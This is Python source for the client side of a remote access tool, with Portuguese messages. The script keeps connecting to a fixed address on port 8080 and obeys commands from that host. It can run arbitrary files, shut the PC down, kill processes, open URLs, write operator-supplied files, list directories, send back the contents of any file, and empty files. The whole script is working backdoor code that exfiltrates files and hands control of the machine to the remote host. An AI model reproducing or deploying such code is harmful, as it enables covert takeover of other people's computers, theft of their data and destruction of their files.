import os
import socket
import time
# os.startfile("executarRadmin.bat")
s = socket.socket()
port = 8080
host = "192.168.88.147"

RED   = "\033[1;31m"  
BLUE  = "\033[1;34m"
CYAN  = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD    = "\033[;1m"
REVERSE = "\033[;7m"

def editURL(url):
   file = open("url.bat","w")
   file.write("@ECHO OFF\n")
   file.write("cls\n")
   file.write("@echo off\n")
   file.write(":funcao\n")
   file.write("START "+url+"\n")
   file.write("CLS\n")
   file.close()

def editProcess(process):
   file = open("explorer.bat","w")
   file.write("@ECHO OFF\n")
   file.write("cls\n")
   file.write("@echo off\n")
   file.write("TASKKILL /F /IM "+process+"\n")
   file.close()

while 1:
   try:
       s.connect((host,port))
       break
   except socket.error:
       print("Procurando client...")
print("Conectado ao servidor com sucesso")
while 1:
    command = s.recv(1024)
    command = command.decode()
    print("comando recebido")
    
    if command == "turn_off_pc": #OK
        os.startfile("desligar.vbs")

    elif command == "shuffleMouse": #OK
        os.startfile("mouse.vbs")
        
    elif "exeFile|" in command: #OK
        message = ""
        file = command.replace("exeFile|","")
        try:
           os.startfile(file)
           message = GREEN+"Arquivo esta sendo executado..."
        except:
           message = RED+"Falha ao executar este arquivo..."
        s.send(message.encode())
        
    elif "openChrome|" in command: #OK
        url = command.replace("openChrome|","")
        editURL(url)
        os.startfile("url.vbs")
    elif "shutProcess|" in command:
       process = command.replace("shutProcess|","")
       editProcess(process)
       os.startfile("explorer.vbs")
       
    elif "sendFile|" in command:
       data = command.replace("sendFile|","")
       message = RED+"Erro ao criar o arquivo..."
       try:
          file = open("panzer.py","w")
          file.write(data)
          file.close()
          message = GREEN+"Sucesso ao criar o arquivo..."
          
       except:
          print()
       s.send(message.encode())
      

    elif "showDir|" in command:
       path = command.replace("showDir|","")
       message = ""
       try:
          path = os.listdir(path)
          for files in path:
             if "." in files:
                message = message + (files+"\n"+RED)
             else:
                message = message + (files+CYAN+" (PASTA)\n"+RED)
          
       except:
          message = "NÃO FOI ENCONTRADO..."
          
       s.send(message.encode())
      

    elif "downloadFile|" in command:
       print("Procurando arquivo...")
       file = command.replace("downloadFile|","")
       content = RED+"Não foi possivel..."
       try:
          if os.path.isfile(file):
                data = open(file,"r")
                content = ""
                for lines in data:
                   content = content + lines +"\n"
                data.close()
          else:
             print("ERRO")
       except:
          content = RED+"Diretorio inválido..."
          
       s.send(content.encode())

    elif "deleteFile|" in command:
       print("Procurando arquivo...")
       file = command.replace("deleteFile|","")
       content = RED+"Não foi possivel..."
       print("Tentando obter: "+file)
       try:
          if os.path.isfile(file):
                content = GREEN+"Apagado com sucesso"
                data = open(file,"w")
                data.write("")
                data.close()
       except:
          content = RED+"Diretorio inválido..."
          
       s.send(content.encode())
       
    else:
        print("o comando nao foi encontrado")
